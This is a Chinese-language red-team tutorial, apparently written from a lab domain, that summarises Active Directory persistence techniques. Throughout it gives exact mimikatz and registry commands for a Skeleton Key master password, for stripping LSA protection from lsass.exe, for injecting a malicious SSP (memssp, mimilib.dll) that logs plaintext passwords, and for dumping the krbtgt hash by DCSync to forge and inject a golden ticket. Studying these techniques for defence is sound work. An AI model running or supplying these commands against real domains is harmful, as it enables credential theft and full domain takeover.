前言：本文总结一些常见的域内维持技术，如有错误之处，还请师傅们指正。
## 实验环境
域名：redteam  
域控： 192.168.1.132 主机名:DC 版本:winserver2019 x64  
有域管权限的域内机器：192.168.1.133 主机名:IT 版本:winserver2012 x64
# 万能密码(Skeleton-Key)
### 使用前置
  * **在64位域控服务器上使用** ，因为skeleton key被安装在64位DC上
  * **只是让所有域用户使用同一个万能密码进行登录** 其目前用户可以用原密码进行登录
  * 重启后失效
### mimikatz万能密码实现原理
在DC上以域控权限运行skeleton,能够将Kerberos认证加密降到RC4_HMAC_MD5，并以内存更新的方式给lsass.exe进程patch一个主密码mimikatz。
## 实验
#### 一、使用域内普通用户访问域控
#### 二、使用域内管理员访问域控
#### 三、在域控以管理员权限运行mimikatz
    privilege::debug
    misc::skeleton
#### 四、查看现有的连接机器并且注销
    net use        
    net use  \\192.168.1.132\ipc$ /del /y
#### 五、使用域管理员账号和Skeleton Key与域控连接
    net use \\DC\c$ "mimikatz" /user:redteam\administrator
### 其他测试
#### 使用域控IP直接连接
无法连接，只能使用域控主机名连接
#### 使用普通域用户连接
使用普通域用户IT建立连接无权限访问域控C盘内容,只能patch密码的域管才有访问权限
#### 重启域控尝试建立连接
重启域控，万能密码失效
### LSA绕过
#### 开启LSA保护
微软自Windows 8.1 开始为LSA提供了额外的保护（LSA
Protection），以防止读取内存和不受保护的进程注入代码。保护模式要求所有加载到LSA的插件都必须使用Microsoft签名进行数字签名  
配置注册表测试。
注册表路径
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
新建-DWORD（32）值，名称为 RunAsPPL,数值为 00000001，然后重启系统生效
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "RunAsPPL" /t REG_DWORD /d "00000001" /f
域控尝试注入万能密码  
在开启LSA保护后，万能密码注入失败
#### 绕过
mimikatz其中的mimidrv.sys驱动程序，可从lsass.exe进程中删除LSA保护，成功bpypass LSA
Protection(注意需要拷贝mimidrv.sys到同级目录)
    privilege::debug
    !+
    !processprotect /process:lsass.exe /remove
    misc::skeleton
之后再次测试连接  
# SSP
SSP(Security Support
Provider)是Windows操作系统安全机制的提供者。简单地说，SSP是个DLL文件，主要用来实现Windows操作系统的身份认证功能，例如NTLM、Ketberos,Negotiare.
Seure Channe (Schannel )、Digest、Credental ( CredSSP )。
SSPI ( Security Support Provider
Interfce.安全支持提供程序接口)是Windows操作系统在执行认证操作时使用的API接口。可以说，SSPI是SSP的API接口。
如果获得了网络中目标机器的System权限，可以使用该方法进行持久化操作。其主要原理是: LSA (Local Security
Authority)用于身份验证; lsass.exe 作为Windows的系统进程，用于本地安全和登录策略;在系统启动时，SSP
将被加载到lsass.exe进程中。但是，假如攻击者对LSA进行了扩展，自定义了恶意的DLL文件，在系统启动时将其加载到lsass.exe进程中，就能够获取lsass.exe进程中的明文密码。这样，即使用户更改密码并重新登录，攻击者依然可以获取该账号的新密码。
## memssp加载到内存
原理：主要通过往lsass进程注入代码来patch其加载的msv1_0.dll中的 **SpAcceptCredentials** 函数来恢复凭据信息。
注意事项：使用mimikatz将伪造的SSP注人内存。这样做不会在系统中留下二进制文件，但如果域控制器重启，被注人内存的伪造的SSP将会丢失。
#### 内存注入
    privilege::debug
    misc::memssp
#### 注销当前用户重新登录
重新登录后，在C:\Windows\System32\mimilsa.log成功获得明文密码  
## SSP中加载mimilib.dll
原理：mimikatz自带mimilib.dll也实现了SSP功能，mimikatz利用AddSecurityPackage此API来加载SSP，可在不重启的情况下添加mimilib.dll。
该dll包含SpLsaModelntialize导出函数，lsass.exe会使用该函数来初始化包含多个回调函数的一个结构体，其中回调函数SpAcceptCredentials用来接收LSA传递的明文凭据。
### 操作
将mimikatz中的mimilib.dll放到系统的`C:\Windows\System32\`目录下，并将mimilib添加到注册表中。使用这种方法，系统重启也不会影响持久化的效果。  
之后添加注册表
    reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "mimilib.dll" /t REG_MULTI_SZ
重启机器后重新登录，获取到的明文保存在C:\Windows\System32\Kiwissp.log  
#### 两种方式差异总结
  * 加载到内存：必须重新登录，重新启动后不会存在
  * ssp中加载mimilib.dll：必须重启，永久有效
# 黄金票据
Golden Ticket是通过伪造的TGT（TicketGranting
Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了黄金票据就有了域内的最高权限。
## 制作条件
> 1、域名称
>
> 2、域的SID值
>
> 3、域的KRBTGT账户密码HASH
>
> 4、伪造用户名，可以是任意的
## 利用
黄金票据的生成需要用到krbtgt账户的密码HASH值，可以通过mimikatz中的
    lsadump::dcsync /redteam.local /user:krbtgt
命令获取krbtgt的值。  
得到krbtgt账户的HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。
参数说明：
    /admin：伪造的用户名
    /domain：域名称
    /sid：SID值，注意是去掉最后一个-后面的值
    /krbtgt：krbtgt的HASH值
    /ticket：生成的票据名称
去掉最后一个值得到域的sid值：S-1-5-21-3458133008-801623762-2841880732  
之后生成黄金票据
    kerberos::golden /admin:administrator /domain:redteam.local /sid:S-1-5-21-3458133008-801623762-2841880732 /krbtgt:c1fae0c27a40526e4ade2065d9646427 /ticket:golden.kiribi
再通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。
    kerberos::purge
    kerberos::ptt golden.kiribi
    kerberos::list
此时就可以访问域控的文件  
#### 注意
  * 这种方式导入的Ticket默认在20分钟以内生效，如果过期了，再次ptt导入Golden Ticket即可。